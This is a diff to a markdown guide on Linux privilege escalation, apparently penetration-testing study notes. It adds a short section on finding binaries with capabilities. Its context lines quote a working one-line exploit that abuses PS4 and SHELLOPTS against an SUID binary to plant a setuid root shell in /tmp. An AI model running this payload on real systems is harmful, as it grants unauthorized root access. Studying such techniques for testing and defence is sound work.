@@ -389,4 +389,12 @@ Thus, by adding an embedded command into the `PS4` environment variable we can h
 
 `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`
 
+### 19. Capabilities
+
+This is a way system admins gives permissions to a binary so that it can be run by a particular user on the machine. 
+
+In order to look for the capabilities, run the following command. 
+
+`getcap -r / 2>/dev/null`
+
 ---
